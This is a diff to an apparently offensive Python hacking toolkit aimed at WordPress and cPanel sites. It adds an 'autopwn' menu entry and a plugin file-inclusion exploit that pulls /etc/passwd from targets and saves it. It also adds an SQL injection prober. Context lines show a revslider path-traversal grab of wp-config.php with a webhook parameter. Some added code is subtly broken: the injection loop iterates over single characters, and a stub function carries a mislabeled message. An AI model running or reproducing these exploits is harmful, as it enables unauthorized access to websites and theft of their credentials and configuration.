@@ -18,6 +18,7 @@ def print_warning(a):
 def helper():
     print(f'''{Fore.LIGHTBLACK_EX}
 Modules : 
+    {Fore.LIGHTGREEN_EX}autopwn     {Fore.MAGENTA}-   {Fore.WHITE}Automaticly start all known vulnerabilitys on a target
     {Fore.LIGHTGREEN_EX}cloudssp    {Fore.MAGENTA}-   {Fore.WHITE}CPanel vulnerability to get the host backend
     {Fore.LIGHTGREEN_EX}remotedown  {Fore.MAGENTA}-   {Fore.WHITE}Remote download vulnerability in Wordpress and NameCheap websites  
     {Fore.LIGHTGREEN_EX}heartbleed  {Fore.MAGENTA}-   {Fore.WHITE}Allows remote attackers to obtain sensitive information from process memory
@@ -94,16 +95,21 @@ def requestdir(url):
     elif req.status_code != 404:
         print_sucess(f'{Fore.YELLOW}{req.status_code}{Fore.WHITE}  -  {url}')
 
+def requestdir2(url):
+    req = requests.get(url=url, timeout=5,  headers={"user-agent": useragent()})
+    if req.status_code == 200:
+        print_sucess(f'{Fore.GREEN}{req.status_code}{Fore.WHITE}  -  {url}')
+    elif req.status_code != 404:
+        print_sucess(f'{Fore.YELLOW}{req.status_code}{Fore.WHITE}  -  {url}')
+
 def dirscan(target):
     print()
     dirs = open('dirs.txt', 'r').readlines()
     for content in dirs:
         content = content.rstrip()
         url = target+'/'+content
-        t = threading.Thread(target=requestdir, args=(url, ))
-        t.start()
-        time.sleep(0.1)
-        
+        requestdir(url=url)
+
 def configdownload(target, webhook=webhook):
     print_info(f'Starting module Config Download on {target}')
     req = requests.get(target + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
@@ -135,3 +141,33 @@ def configdownload(target, webhook=webhook):
             print_sucess('Output saved to output.txt\n')
     else:
         print_error('Target isn\'t vulnerable\n')
+
+
+def urlinclusion(url):
+    url = url+'/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd'
+    req = requests.get(url=url, timeout=5,  headers={"user-agent": useragent()})
+    if req.status_code == 200:
+        files = open('passwd.txt', "w")
+        files.write(req.text)
+        print_sucess('Target is vulnerable output saved to passwd.txt')
+    else:
+        print_error('Target isn\'t vulnerable\n')
+
+def sqli(url):
+    if '[attack]' in url:
+        print_info('Using [attack] as placement for attack param')
+    else:
+        print_error('Please add [attack] to your urls param to sqli')
+        return
+    
+    paramAttack = open('SQLI.txt', 'r').readline()
+
+    for param in paramAttack:
+        url = url.replace('[attack]', param.lower())
+        req = requests.get(url=url, timeout=5,  headers={"user-agent": useragent()})
+        if req.status_code == 200:
+            if 'SQL syntax near' in req.text:
+                print_sucess(f'Posible SQLI : {url}')
+
+def l4(target):
+    print_info(f'Starting module Config Download on {target}')
